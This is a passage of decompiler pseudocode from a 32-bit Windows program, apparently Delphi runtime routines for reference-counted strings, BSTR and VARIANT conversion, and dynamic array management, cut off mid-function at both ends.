      _InterlockedDecrement((volatile signed __int32 *)v4 - 2);
    sub_4026B0(v4, v3, *((_DWORD *)v4 - 1));
    return *a1;
  }
  return v1;
}

//----- (0040392C) --------------------------------------------------------
_DWORD *__userpurge sub_40392C@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, char **a4)
{
  int v4; // ebx
  bool v5; // sf
  bool v6; // of
  int v7; // edx
  int v8; // ebx

  if ( !a1 )
    return sub_4034C8(a4);
  v4 = *(_DWORD *)(a1 - 4);
  if ( !v4 )
    return sub_4034C8(a4);
  v6 = __OFSUB__(a2, 1);
  v5 = a2 - 1 < 0;
  v7 = a2 - 1;
  if ( v5 != v6 )
  {
    v7 = 0;
  }
  else if ( v7 >= v4 )
  {
    return sub_4034C8(a4);
  }
  v8 = v4 - v7;
  if ( a3 < 0 )
    return sub_4034C8(a4);
  if ( a3 > v8 )
    a3 = v8;
  return sub_4035B0(a4, (char *)(a1 + v7), a3);
}

//----- (0040396C) --------------------------------------------------------
char *__usercall sub_40396C@<eax>(char **a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  char *result; // eax
  char *v7; // edx
  int v8; // ecx
  bool v9; // sf
  bool v10; // of
  int v11; // esi
  int v12; // ecx

  result = sub_4038F4(a1);
  v7 = *a1;
  if ( *a1 )
  {
    v8 = *((_DWORD *)v7 - 1);
    v10 = __OFSUB__(a2, 1);
    v9 = a2 - 1 < 0;
    v11 = a2 - 1;
    if ( v9 == v10 && v11 < v8 && a3 > 0 )
    {
      v12 = v8 - v11;
      if ( a3 > v12 )
        a3 = v12;
      sub_4026B0(&v7[v11 + a3], &v7[v11], v12 - a3);
      return (char *)sub_4039FC(a1, *((_DWORD *)*a1 - 1) - a3);
    }
  }
  return result;
}

//----- (004039B4) --------------------------------------------------------
_BYTE *__usercall sub_4039B4@<eax>(_BYTE *result@<eax>, _BYTE *a2@<edx>)
{
  _BYTE *v2; // esi
  _BYTE *v3; // edi
  signed int v4; // ecx
  signed int v5; // edx
  unsigned __int8 v6; // al
  const void *v7; // esi
  bool v8; // zf
  bool v9; // cc
  int v10; // ecx
  int v11; // ebx
  _BYTE *v12; // [esp-18h] [ebp-18h]
  const void *v13; // [esp-14h] [ebp-14h]

  if ( result )
  {
    if ( a2 )
    {
      v2 = result;
      v3 = a2;
      v4 = *((_DWORD *)a2 - 1);
      v5 = *((_DWORD *)result - 1) - 1;
      if ( v5 >= 0 )
      {
        v6 = *result;
        v7 = v2 + 1;
        v8 = v4 == v5;
        v9 = v4 <= v5;
        v10 = v4 - v5;
        if ( !v9 )
        {
          while ( 1 )
          {
            do
            {
              if ( !v10 )
                break;
              v8 = *v3++ == v6;
              --v10;
            }
            while ( !v8 );
            if ( !v8 )
              break;
            v11 = v10;
            v13 = v7;
            v12 = v3;
            v8 = memcmp(v7, v3, v5) == 0;
            v3 = v12;
            v7 = v13;
            if ( v8 )
              return (_BYTE *)(v12 - a2);
            v10 = v11;
          }
        }
      }
      return 0;
    }
    else
    {
      return 0;
    }
  }
  return result;
}

//----- (004039FC) --------------------------------------------------------
_DWORD *__usercall sub_4039FC@<eax>(char **a1@<eax>, int a2@<edx>)
{
  char *v4; // edi
  char *v5; // eax
  _DWORD *result; // eax
  char *v7; // eax
  int v8; // ecx
  char *v9; // [esp-4h] [ebp-10h] BYREF

  v4 = 0;
  if ( a2 )
  {
    v5 = *a1;
    if ( *a1 && *((_DWORD *)v5 - 2) == 1 )
    {
      v9 = v5 - 8;
      sub_4025C8(&v9, a2 + 9);
      result = v9 + 8;
      *a1 = v9 + 8;
      *(result - 1) = a2;
      *((_BYTE *)result + a2) = 0;
      return result;
    }
    v4 = (char *)sub_40358C(a2);
    v7 = *a1;
    if ( *a1 )
    {
      v8 = *((_DWORD *)v7 - 1);
      if ( v8 >= a2 )
        v8 = a2;
      sub_4026B0(v7, v4, v8);
    }
  }
  result = sub_4034C8(a1);
  *a1 = v4;
  return result;
}

//----- (00403A60) --------------------------------------------------------
_DWORD *__usercall sub_403A60@<eax>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  signed int v3; // edx
  signed int v4; // ecx
  _DWORD *v5; // eax
  signed int v7; // [esp-8h] [ebp-8h]

  v3 = 0;
  v4 = 0;
  if ( a2 )
  {
    v4 = *((_DWORD *)a2 - 1);
    v3 = -v4;
  }
  v7 = v4;
  v5 = sub_4051AF(a1, v3);
  return sub_405144(v5, a2, v7);
}

//----- (00403A90) --------------------------------------------------------
OLECHAR **__usercall sub_403A90@<eax>(OLECHAR **result@<eax>)
{
  OLECHAR *v1; // edx
  OLECHAR **v2; // [esp-4h] [ebp-4h]

  v1 = *result;
  if ( *result )
  {
    *result = 0;
    v2 = result;
    SysFreeString(v1);
    return v2;
  }
  return result;
}

//----- (00403AA8) --------------------------------------------------------
void __usercall sub_403AA8(OLECHAR **a1@<eax>, int a2@<edx>)
{
  OLECHAR *v4; // eax

  do
  {
    v4 = *a1;
    if ( *a1 )
    {
      *a1 = 0;
      SysFreeString(v4);
    }
    ++a1;
    --a2;
  }
  while ( a2 );
}

//----- (00403ACC) --------------------------------------------------------
OLECHAR **__usercall sub_403ACC@<eax>(OLECHAR **a1@<eax>, const OLECHAR *a2@<edx>)
{
  unsigned int v2; // ecx
  OLECHAR **result; // eax

  if ( !a2 )
    return sub_403A90(a1);
  v2 = *((_DWORD *)a2 - 1) >> 1;
  if ( !v2 )
    return sub_403A90(a1);
  result = (OLECHAR **)SysReAllocStringLen(a1, a2, v2);
  if ( !result )
    sub_402618(1);
  return result;
}

//----- (00403AF0) --------------------------------------------------------
char __usercall sub_403AF0@<al>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v4; // esi
  int v5; // edi
  char result; // al
  bool v7; // zf
  bool v8; // sf
  bool v9; // of

  v2 = *(unsigned __int8 *)(a2 + 1);
  v4 = a2 + v2 + 10;
  v5 = *(_DWORD *)(a2 + v2 + 6);
  do
  {
    result = sub_403BB0((_DWORD *)(a1 + *(_DWORD *)(v4 + 4)), **(char ***)v4);
    v4 += 8;
    v9 = __OFSUB__(v5, 1);
    v7 = v5 == 1;
    v8 = --v5 < 0;
  }
  while ( !(v8 ^ v9 | v7) );
  return result;
}

//----- (00403B1C) --------------------------------------------------------
char __usercall sub_403B1C@<al>(_DWORD *a1@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  char result; // al
  int v7; // edx
  bool v8; // cc
  int v9; // ebp
  _DWORD *v10; // eax
  int v11; // ebp
  _DWORD *v12; // eax

  result = *a2;
  v7 = (unsigned __int8)a2[1];
  switch ( result )
  {
    case 10:
    case 11:
      do
      {
LABEL_9:
        *a1++ = 0;
        v8 = a3-- <= 1;
      }
      while ( !v8 );
      return result;
    case 12:
      do
      {
        *a1 = 0;
        a1[1] = 0;
        a1[2] = 0;
        a1[3] = 0;
        a1 += 4;
        v8 = a3-- <= 1;
      }
      while ( !v8 );
      break;
    case 13:
      v9 = v7;
      do
      {
        v10 = a1;
        a1 = (_DWORD *)((char *)a1 + *(_DWORD *)&a2[v9 + 2]);
        result = sub_403B1C(v10, **(char ***)&a2[v9 + 10], *(_DWORD *)&a2[v9 + 6]);
        v8 = a3-- <= 1;
      }
      while ( !v8 );
      break;
    case 14:
      v11 = v7;
      do
      {
        v12 = a1;
        a1 = (_DWORD *)((char *)a1 + *(_DWORD *)&a2[v11 + 2]);
        result = sub_403AF0((int)v12, (int)a2);
        v8 = a3-- <= 1;
      }
      while ( !v8 );
      break;
    case 15:
    case 17:
      goto LABEL_9;
    default:
      sub_402618(2);
  }
  return result;
}

//----- (00403BB0) --------------------------------------------------------
char __usercall sub_403BB0@<al>(_DWORD *a1@<eax>, char *a2@<edx>)
{
  return sub_403B1C(a1, a2, 1);
}

//----- (00403BBC) --------------------------------------------------------
int __usercall sub_403BBC@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int v4; // esi
  int v5; // edi
  bool v6; // zf
  bool v7; // sf
  bool v8; // of

  v2 = *(unsigned __int8 *)(a2 + 1);
  v4 = a2 + v2 + 10;
  v5 = *(_DWORD *)(a2 + v2 + 6);
  do
  {
    sub_403CD0((int *)(a1 + *(_DWORD *)(v4 + 4)), **(char ***)v4);
    v4 += 8;
    v8 = __OFSUB__(v5, 1);
    v6 = v5 == 1;
    v7 = --v5 < 0;
  }
  while ( !(v7 ^ v8 | v6) );
  return a1;
}

//----- (00403BE8) --------------------------------------------------------
int *__usercall sub_403BE8@<eax>(int *result@<eax>, char *a2@<edx>, int a3@<ecx>)
{
  int *v3; // ebx
  int v5; // edi
  char v6; // al
  int v7; // edx
  VARIANTARG *v8; // eax
  bool v9; // cc
  int v10; // ebp
  int *v11; // eax
  int v12; // ebp
  int v13; // eax
  int *v14; // eax
  int *v15; // eax
  int *v16; // [esp-4h] [ebp-4h]

  if ( a3 )
  {
    v16 = result;
    v3 = result;
    v5 = a3;
    v6 = *a2;
    v7 = (unsigned __int8)a2[1];
    switch ( v6 )
    {
      case 10:
        if ( a3 > 1 )
          sub_4034EC((int)v3, a3);
        else
          sub_4034C8(v3);
        break;
      case 11:
        if ( a3 > 1 )
          sub_403AA8((OLECHAR **)v3, a3);
        else
          sub_403A90((OLECHAR **)v3);
        break;
      case 12:
        do
        {
          v8 = (VARIANTARG *)v3;
          v3 += 4;
          sub_4043B8(v8);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 13:
        v10 = v7;
        do
        {
          v11 = v3;
          v3 = (int *)((char *)v3 + *(_DWORD *)&a2[v10 + 2]);
          sub_403BE8(v11, **(char ***)&a2[v10 + 10], *(_DWORD *)&a2[v10 + 6]);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 14:
        v12 = v7;
        do
        {
          v13 = (int)v3;
          v3 = (int *)((char *)v3 + *(_DWORD *)&a2[v12 + 2]);
          sub_403BBC(v13, (int)a2);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 15:
        do
        {
          v14 = v3++;
          sub_404BD8(v14);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      case 17:
        do
        {
          v15 = v3++;
          sub_4045AC(v15, (int)a2);
          v9 = v5-- <= 1;
        }
        while ( !v9 );
        break;
      default:
        sub_402618(2);
    }
    return v16;
  }
  return result;
}

//----- (00403CD0) --------------------------------------------------------
int *__usercall sub_403CD0@<eax>(int *a1@<eax>, char *a2@<edx>)
{
  return sub_403BE8(a1, a2, 1);
}

//----- (00403CDC) --------------------------------------------------------
int __usercall sub_403CDC@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v5; // edi
  int v6; // ebp
  int result; // eax
  int v8; // ecx
  bool v9; // cc
  int v10; // ecx
  int v11; // eax
  char *v12; // edx
  char v13; // cl
  int v14; // eax
  int v15; // ecx
  int v16; // [esp-8h] [ebp-18h]
  int v17; // [esp-8h] [ebp-18h]
  int v18; // [esp-4h] [ebp-14h]

  v5 = a3 + *(unsigned __int8 *)(a3 + 1) + 10;
  v6 = *(_DWORD *)(a3 + *(unsigned __int8 *)(a3 + 1) + 6);
  result = 0;
  v18 = *(_DWORD *)(a3 + *(unsigned __int8 *)(a3 + 1) + 2);
  do
  {
    v8 = *(_DWORD *)(v5 + 4);
    v9 = v8 <= result;
    v10 = v8 - result;
    if ( !v9 )
      sub_4026B0((char *)(a2 + result), (char *)(a1 + result), v10);
    v11 = *(_DWORD *)(v5 + 4);
    v12 = **(char ***)v5;
    v13 = *v12;
    if ( *v12 == 10 )
    {
      sub_40351C((volatile __int32 *)(a1 + v11), *(_DWORD *)(a2 + v11));
      v14 = 4;
    }
    else
    {
      switch ( v13 )
      {
        case 11:
          sub_403ACC((OLECHAR **)(a1 + v11), *(const OLECHAR **)(a2 + v11));
          v14 = 4;
          break;
        case 12:
          sub_404074((VARIANT *)(a1 + v11), (VARIANT *)(a2 + v11));
          v14 = 16;
          break;
        case 13:
          v15 = (unsigned __int8)v12[1];
          v16 = *(_DWORD *)&v12[v15 + 2];
          sub_403DF8(
            (volatile __int32 *)(a1 + v11),
            (__int32 *)(a2 + v11),
            **(char ***)&v12[v15 + 10],
            *(_DWORD *)&v12[v15 + 6]);
          v14 = v16;
          break;
        case 14:
          v17 = *(_DWORD *)&v12[(unsigned __int8)v12[1] + 2];
          sub_403CDC(a1 + v11, a2 + v11, (int)v12);
          v14 = v17;
          break;
        case 15:
          sub_404BF0((int *)(a1 + v11), *(_DWORD *)(a2 + v11));
          v14 = 4;
          break;
        case 17:
          sub_4045E8((int *)(a1 + v11), *(_DWORD *)(a2 + v11), **(_DWORD **)v5);
          v14 = 4;
          break;
        default:
          sub_402618(2);
      }
    }
    result = *(_DWORD *)(v5 + 4) + v14;
    v5 += 8;
    --v6;
  }
  while ( v6 );
  if ( v18 > result )
    return sub_4026B0((char *)(a2 + result), (char *)(a1 + result), v18 - result);
  return result;
}

//----- (00403DF8) --------------------------------------------------------
void *__userpurge sub_403DF8@<eax>(volatile __int32 *a1@<eax>, __int32 *a2@<edx>, char *a3@<ecx>, int a4)
{
  char v8; // cl
  void *result; // eax
  char *v10; // edi

  v8 = *a3;
  switch ( v8 )
  {
    case 10:
      do
      {
        result = (void *)sub_40351C(a1++, *a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 11:
      do
      {
        result = sub_403ACC((OLECHAR **)a1++, (const OLECHAR *)*a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 12:
      do
      {
        result = sub_404074((VARIANT *)a1, (VARIANT *)a2);
        a1 += 4;
        a2 += 4;
        --a4;
      }
      while ( a4 );
      break;
    case 13:
      v10 = &a3[(unsigned __int8)a3[1] + 2];
      do
      {
        result = sub_403DF8(a1, a2, *((char **)v10 + 2), *((_DWORD *)v10 + 1));
        a1 = (volatile __int32 *)((char *)a1 + *(_DWORD *)v10);
        a2 = (__int32 *)((char *)a2 + *(_DWORD *)v10);
        --a4;
      }
      while ( a4 );
      break;
    case 14:
      do
      {
        sub_403CDC((int)a1, (int)a2, (int)a3);
        result = (void *)(unsigned __int8)a3[1];
        a1 = (volatile __int32 *)((char *)a1 + *(_DWORD *)((char *)result + (_DWORD)a3 + 2));
        a2 = (__int32 *)((char *)a2 + *(_DWORD *)((char *)result + (_DWORD)a3 + 2));
        --a4;
      }
      while ( a4 );
      break;
    case 15:
      do
      {
        result = sub_404BF0((int *)a1++, *a2++);
        --a4;
      }
      while ( a4 );
      break;
    case 17:
      do
      {
        result = sub_4045E8((int *)a1++, *a2++, (int)a3);
        --a4;
      }
      while ( a4 );
      break;
    default:
      sub_402618(2);
  }
  return result;
}

//----- (00403EEC) --------------------------------------------------------
_DWORD *__usercall sub_403EEC@<eax>(const WCHAR *a1@<eax>, int a2@<edx>, char **a3@<ecx>)
{
  int v7; // eax
  int v8; // ebp
  CHAR MultiByteStr[2064]; // [esp+0h] [ebp-810h] BYREF

  if ( !a2 )
    return sub_4034C8(a3);
  if ( a2 >= 1024 )
  {
    v8 = WideCharToMultiByte(0, 0, a1, a2, 0, 0, 0, 0);
    sub_4035B0(a3, 0, v8);
    return (_DWORD *)WideCharToMultiByte(0, 0, a1, a2, *a3, v8, 0, 0);
  }
  else
  {
    v7 = WideCharToMultiByte(0, 0, a1, a2, MultiByteStr, 2048, 0, 0);
    return sub_4035B0(a3, MultiByteStr, v7);
  }
}

//----- (00403F78) --------------------------------------------------------
_DWORD *__usercall sub_403F78@<eax>(OLECHAR *a1@<eax>, char **a2@<edx>)
{
  int v4; // eax

  v4 = SysStringLen(a1);
  return sub_403EEC(a1, v4, a2);
}

//----- (00403F9C) --------------------------------------------------------
BSTR __usercall sub_403F9C@<eax>(CHAR *a1@<eax>)
{
  int v2; // esi
  char *v3; // eax
  int v4; // eax
  WCHAR *v5; // edi
  int v6; // ebp
  WCHAR WideCharStr[1032]; // [esp+0h] [ebp-810h] BYREF

  v2 = sub_403724((int)a1);
  if ( sub_403724((int)a1) >= 1024 )
  {
    v6 = MultiByteToWideChar(0, 0, a1, v2, 0, 0);
    v5 = SysAllocStringLen(0, v6);
    MultiByteToWideChar(0, 0, a1, v2, v5, v6);
  }
  else
  {
    v3 = sub_4038E8(a1);
    v4 = MultiByteToWideChar(0, 0, v3, v2, WideCharStr, 1024);
    return SysAllocStringLen(WideCharStr, v4);
  }
  return v5;
}

//----- (00404020) --------------------------------------------------------
void __noreturn sub_404020()
{
  sub_402618(15);
}

//----- (00404030) --------------------------------------------------------
VARIANTARG *__usercall sub_404030@<eax>(VARIANTARG *result@<eax>)
{
  unsigned int vt; // edx

  vt = result->vt;
  if ( (result->vt & 0x4000) != 0 || vt < 8 )
  {
    result->vt = 0;
  }
  else if ( vt == 256 )
  {
    result->vt = 0;
    return (VARIANTARG *)sub_4034C8(&result->lVal);
  }
  else if ( vt == 257 )
  {
    return (VARIANTARG *)dword_41E3E0();
  }
  else
  {
    return (VARIANTARG *)VariantClear(result);
  }
  return result;
}
// 41E3E0: using guessed type int (*dword_41E3E0)(void);

//----- (00404074) --------------------------------------------------------
VARIANT *__usercall sub_404074@<eax>(VARIANT *result@<eax>, VARIANT *a2@<edx>)
{
  LONG lVal; // edx
  VARIANT *v3; // [esp-8h] [ebp-8h]
  VARIANT *v4; // [esp-4h] [ebp-4h]

  if ( result == a2 )
    return (VARIANT *)nullsub_2();
  if ( result->vt >= 8u )
  {
    v4 = result;
    v3 = a2;
    if ( result->vt == 256 )
    {
      sub_4034C8(&result->lVal);
    }
    else if ( result->vt == 257 )
    {
      dword_41E3E0();
    }
    else
    {
      VariantClear(result);
    }
    a2 = v3;
    result = v4;
  }
  if ( a2->vt < 8u )
    return (VARIANT *)sub_4040B2(result, a2);
  if ( a2->vt != 256 )
  {
    if ( a2->vt == 257 )
    {
      sub_4040B2(result, a2);
      return (VARIANT *)dword_41E3E8();
    }
    result->vt = 0;
    if ( VariantCopyInd(result, a2) )
      sub_402618(16);
    return (VARIANT *)nullsub_2();
  }
  lVal = a2->lVal;
  if ( lVal && !((*(_DWORD *)(lVal - 8) + 1 < 0) ^ __OFADD__(1, *(_DWORD *)(lVal - 8)) | (*(_DWORD *)(lVal - 8) == -1)) )
    _InterlockedIncrement((volatile signed __int32 *)(lVal - 8));
  result->vt = 256;
  result->lVal = lVal;
  return result;
}
// 40410C: using guessed type int nullsub_2(void);
// 41E3E0: using guessed type int (*dword_41E3E0)(void);
// 41E3E8: using guessed type int (*dword_41E3E8)(void);

//----- (004040B2) --------------------------------------------------------
_DWORD *__usercall sub_4040B2@<eax>(_DWORD *result@<eax>, _DWORD *a2@<edx>)
{
  *result = *a2;
  result[2] = a2[2];
  result[3] = a2[3];
  return result;
}

//----- (00404110) --------------------------------------------------------
void __usercall sub_404110(VARTYPE a1@<cx>, const void *a2@<edx>, VARIANTARG *a3@<eax>)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-28h] BYREF
  void *v6; // [esp-8h] [ebp-24h]
  int *v7; // [esp-4h] [ebp-20h]
  void *v8; // [esp+0h] [ebp-1Ch]
  VARIANTARG pvarSrc; // [esp+Ch] [ebp-10h] BYREF
  int savedregs; // [esp+1Ch] [ebp+0h] BYREF

  qmemcpy(&pvarSrc, a2, sizeof(pvarSrc));
  sub_4043C0(&pvarSrc);
  v7 = &savedregs;
  v6 = &loc_40416C;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  dword_41E3E4(ExceptionList);
  sub_404194(a1, &pvarSrc, a3);
  __writefsdword(0, (unsigned int)v6);
  v8 = &loc_404173;
  sub_4043B8(&pvarSrc);
}
// 41E3E4: using guessed type int (__stdcall *dword_41E3E4)(_DWORD);

//----- (0040417C) --------------------------------------------------------
int __usercall sub_40417C@<eax>(VARTYPE a1@<cx>, _WORD *a2@<edx>, VARIANTARG *a3@<eax>)
{
  int v3; // ebx

  v3 = 0;
  if ( *a2 == 257 )
  {
    sub_404110(a1, a2, a3);
    LOBYTE(v3) = 1;
  }
  return v3;
}

//----- (00404194) --------------------------------------------------------
void __usercall sub_404194(VARTYPE vt@<cx>, VARIANTARG *pvarSrc@<edx>, VARIANTARG *a3@<eax>)
{
  __int16 v6; // ax
  VARIANTARG pvargDest; // [esp+Ch] [ebp-10h] BYREF

  v6 = a3->vt - 256;
  if ( v6 )
  {
    if ( v6 == 1 )
    {
      sub_404110(vt, pvarSrc, a3);
    }
    else if ( !(unsigned __int8)sub_40417C(vt, pvarSrc, a3) )
    {
      if ( VariantChangeTypeEx(a3, pvarSrc, 0x400u, 0, vt) )
        sub_404020();
    }
  }
  else if ( !(unsigned __int8)sub_40417C(vt, pvarSrc, a3) )
  {
    pvargDest.vt = 0;
    if ( VariantChangeTypeEx(&pvargDest, pvarSrc, 0x400u, 0, vt) )
      sub_404020();
    sub_404030(a3);
    *(_DWORD *)&a3->vt = *(_DWORD *)&pvargDest.vt;
    a3->llVal = pvargDest.llVal;
  }
}

//----- (00404238) --------------------------------------------------------
char *__usercall sub_404238@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>)
{
  char *result; // eax
  char *v4; // [esp+4h] [ebp-4h] BYREF

  v4 = 0;
  sub_403F78(*(OLECHAR **)(a2 + 8), &v4);
  sub_404030(a1);
  a1->vt = 256;
  result = v4;
  a1->lVal = (LONG)v4;
  return result;
}

//----- (00404268) --------------------------------------------------------
VARIANTARG *__usercall sub_404268@<eax>(VARIANTARG *a1@<eax>, int a2@<edx>)
{
  BSTR v3; // esi
  VARIANTARG *result; // eax

  v3 = sub_403F9C(*(CHAR **)(a2 + 8));
  result = sub_404030(a1);
  a1->vt = 8;
  a1->lVal = (LONG)v3;
  return result;
}

//----- (00404288) --------------------------------------------------------
void __usercall sub_404288(VARTYPE vt@<cx>, VARIANTARG *a2@<eax>, VARIANTARG *a3@<edx>)
{
  VARTYPE v3; // ax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v6; // [esp-8h] [ebp-20h]
  int *v7; // [esp-4h] [ebp-1Ch]
  VARIANTARG *v8; // [esp+4h] [ebp-14h]
  VARIANTARG pvarSrc; // [esp+8h] [ebp-10h] BYREF
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v8 = a2;
  v3 = a3->vt;
  if ( vt == a3->vt )
  {
    sub_404074(v8, a3);
  }
  else if ( v3 == 256 )
  {
    if ( vt == 8 )
    {
      sub_404268(v8, (int)a3);
    }
    else
    {
      pvarSrc.vt = 0;
      sub_404268(&pvarSrc, (int)a3);
      v7 = &savedregs;
      v6 = &loc_404301;
      ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)&ExceptionList);
      sub_404194(vt, &pvarSrc, v8);
      __writefsdword(0, (unsigned int)ExceptionList);
      v7 = (int *)&loc_404377;
      sub_404030(&pvarSrc);
    }
  }
  else if ( vt != 256 || v3 == 257 )
  {
    sub_404194(vt, a3, v8);
  }
  else if ( v3 == 8 )
  {
    sub_404238(v8, (int)a3);
  }
  else
  {
    pvarSrc.vt = 0;
    sub_404194(8u, a3, &pvarSrc);
    v7 = &savedregs;
    v6 = &loc_404366;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    sub_404238(v8, (int)&pvarSrc);
    __writefsdword(0, (unsigned int)ExceptionList);
    v7 = (int *)&loc_404377;
    sub_404030(&pvarSrc);
  }
}

//----- (0040437C) --------------------------------------------------------
volatile __int32 *__usercall sub_40437C@<eax>(volatile __int32 *a1@<eax>, VARIANTARG *a2@<edx>)
{
  volatile __int32 *result; // eax
  VARIANTARG v4; // [esp+0h] [ebp-14h] BYREF

  if ( a2->vt == 256 )
    return sub_40351C(a1, a2->lVal);
  v4.vt = 0;
  sub_404288(0x100u, &v4, a2);
  sub_4034C8(a1);
  result = v4.plVal;
  *a1 = v4.lVal;
  return result;
}

//----- (004043B8) --------------------------------------------------------
void __usercall sub_4043B8(VARIANTARG *a1@<eax>)
{
  sub_404030(a1);
}

//----- (004043C0) --------------------------------------------------------
VARIANT *__usercall sub_4043C0@<eax>(VARIANT *result@<eax>)
{
  VARIANT v1; // [esp-10h] [ebp-10h] BYREF

  if ( result->vt >= 8u )
  {
    v1 = *result;
    result->vt = 0;
    return sub_404074(result, &v1);
  }
  return result;
}

//----- (004043E4) --------------------------------------------------------
int __usercall sub_4043E4@<eax>(int result@<eax>)
{
  if ( result )
    return *(_DWORD *)(result - 4);
  return result;
}

//----- (004043EC) --------------------------------------------------------
int __usercall sub_4043EC@<eax>(int a1@<eax>)
{
  return sub_4043E4(a1) - 1;
}

//----- (004043F4) --------------------------------------------------------
void *__userpurge sub_4043F4@<eax>(volatile __int32 *a1@<eax>, __int32 *a2@<edx>, char *a3@<ecx>, int a4)
{
  return sub_403DF8(a1, a2, a3, a4);
}

//----- (0040440C) --------------------------------------------------------
// attributes: thunk
int *__usercall sub_40440C@<eax>(int *a1@<eax>, int a2@<edx>)
{
  return sub_4045AC(a1, a2);
}

//----- (00404414) --------------------------------------------------------
int *__userpurge sub_404414@<eax>(int *a1@<eax>, int a2@<edx>, int a3@<ecx>, int *a4)
{
  int *v4; // ebx
  int v5; // edi
  int *result; // eax
  int *v7; // ebx
  int v8; // esi
  char **v9; // eax
  char *v10; // esi
  int v11; // ebx
  int *v12; // ebx
  int v13; // ebx
  int v14; // edi
  int v15; // edi
  int *v16; // [esp+Ch] [ebp-20h] BYREF
  int v17; // [esp+10h] [ebp-1Ch]
  int v18; // [esp+14h] [ebp-18h]
  int v19; // [esp+18h] [ebp-14h]
  int v20; // [esp+1Ch] [ebp-10h]
  int v21; // [esp+20h] [ebp-Ch]
  int v22; // [esp+24h] [ebp-8h]
  int *v23; // [esp+28h] [ebp-4h]
  int *v24; // [esp+34h] [ebp+8h]

  v22 = a3;
  v23 = a1;
  v4 = (int *)*a1;
  v5 = *a4;
  if ( *a4 > 0 )
  {
    v20 = 0;
    if ( v4 )
    {
      v7 = v4 - 1;
      v20 = *v7;
      v4 = v7 - 1;
    }
    v8 = *(unsigned __int8 *)(a2 + 1) + a2;
    v18 = *(_DWORD *)(v8 + 2);
    v9 = *(char ***)(v8 + 6);
    if ( v9 )
      v10 = *v9;
    else
      v10 = 0;
    v17 = v18 * v5;
    if ( v18 * v5 / v5 != v18 )
      sub_402618(4);
    v17 += 8;
    if ( v4 && *v4 != 1 )
    {
      --*v4;
      v11 = sub_402598(v17);
      v19 = v20;
      if ( v5 < v20 )
        v19 = v5;
      if ( v10 )
      {
        sub_4028D4((char *)(v11 + 8), v18 * v19, 0);
        sub_4043F4((volatile __int32 *)(v11 + 8), (__int32 *)*v23, v10, v19);
      }
      else
      {
        sub_4026B0((char *)*v23, (char *)(v11 + 8), v18 * v19);
      }
    }
    else
    {
      v16 = v4;
      if ( v5 < v20 && v10 )
        sub_404404((int *)((char *)v4 + v18 * v5 + 8), v10, v20 - v5);
      sub_4025C8(&v16, v17);
      v11 = (int)v16;
    }
    *(_DWORD *)v11 = 1;
    v12 = (int *)(v11 + 4);
    *v12 = v5;
    v13 = (int)(v12 + 1);
    sub_4028D4((char *)(v13 + v20 * v18), v18 * (v5 - v20), 0);
    if ( v22 > 1 )
    {
      v24 = a4 + 1;
      --v22;
      v14 = v5 - 1;
      if ( v14 >= 0 )
      {
        v15 = v14 + 1;
        v21 = 0;
        do
        {
          sub_404414((int *)(v13 + 4 * v21++), (int)v10, v22, v24);
          --v15;
        }
        while ( v15 );
      }
    }
    result = v23;
    *v23 = v13;
  }
  else
  {
    if ( v5 < 0 )
      sub_402618(4);
    return sub_40440C(v23, a2);
  }
  return result;
}

//----- (004045A0) --------------------------------------------------------
int *__usercall sub_4045A0@<eax>(int *a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  return sub_404414(a1, a2, a3, &a4);
}

//----- (004045AC) --------------------------------------------------------
int *__usercall sub_4045AC@<eax>(int *result@<eax>, int a2@<edx>)
{
  int v2; // ecx
  int *v3; // eax
  char **v4; // edx
  int v5; // ecx
  int *v6; // [esp-4h] [ebp-4h]

  v2 = *result;
  if ( *result )
  {
    *result = 0;
    if ( !_InterlockedDecrement((volatile signed __int32 *)(v2 - 8)) )
    {
      v6 = result;
      v3 = (int *)v2;
      v4 = *(char ***)(a2 + *(unsigned __int8 *)(a2 + 1) + 6);
      if ( v4 )
      {
        v5 = *(_DWORD *)(v2 - 4);
        if ( v5 )
          v3 = sub_403BE8(v3, *v4, v5);
      }
      sub_4025B0((int)(v3 - 2));
      return v6;
    }
  }
  return result;
}

//----- (004045E8) --------------------------------------------------------
int *__usercall sub_4045E8@<eax>(int *result@<eax>, int a2@<edx>, int a3@<ecx>)
{
  int v3; // ebx
  int v4; // [esp-8h] [ebp-Ch]
  int *v5; // [esp-4h] [ebp-8h]

  v3 = *result;
  if ( a2 )
    _InterlockedIncrement((volatile signed __int32 *)(a2 - 8));
  if ( v3 && !_InterlockedDecrement((volatile signed __int32 *)(v3 - 8)) )
  {
    v5 = result;
    v4 = a2;
    ++*(_DWORD *)(v3 - 8);
    sub_4045AC(result, a3);
    a2 = v4;
    result = v5;
  }
  *result = a2;
  return result;
}

//----- (00404610) --------------------------------------------------------
PVOID __usercall sub_404610@<eax>(const void *a1@<eax>)
{
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+0h] [ebp-1Ch] BYREF

  VirtualQuery(a1, &Buffer, 0x1Cu);
  if ( Buffer.State == 4096 )
    return Buffer.AllocationBase;
  else
    return 0;
}

//----- (00404638) --------------------------------------------------------
int __usercall sub_404638@<eax>(int result@<eax>)
{
  _DWORD *v1; // edx

  v1 = (_DWORD *)dword_41C014;
  if ( dword_41C014 )
  {
